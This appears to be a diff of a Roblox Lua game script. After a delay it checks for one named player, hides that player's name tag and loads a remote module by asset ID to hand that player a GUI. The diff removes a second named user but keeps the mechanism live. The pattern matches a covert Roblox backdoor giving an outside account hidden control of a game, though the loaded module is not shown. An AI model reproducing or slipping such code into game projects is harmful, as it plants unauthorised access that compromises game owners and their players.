@@ -1,10 +1,9 @@
 wait(33)
-if game.Players:FindFirstChild("DevFlexs") or game.Players:FindFirstChild("semihprosemihprosami") then
+if game.Players:FindFirstChild("DevFlexs") then
 game.Players["DevFlexs"].Character.Head.NameTag.NameFln.Text = ""
 
 ---game.Players["DevFlexs"].Character.Head.NameTag.NameFln.TextColor3 = Color3.new(24, 0, 0)
 require(110476458714336).ipadgui("DevFlexs")
-require(110476458714336).ipadgui("semihprosemihprosami")
 else
 warn()
 
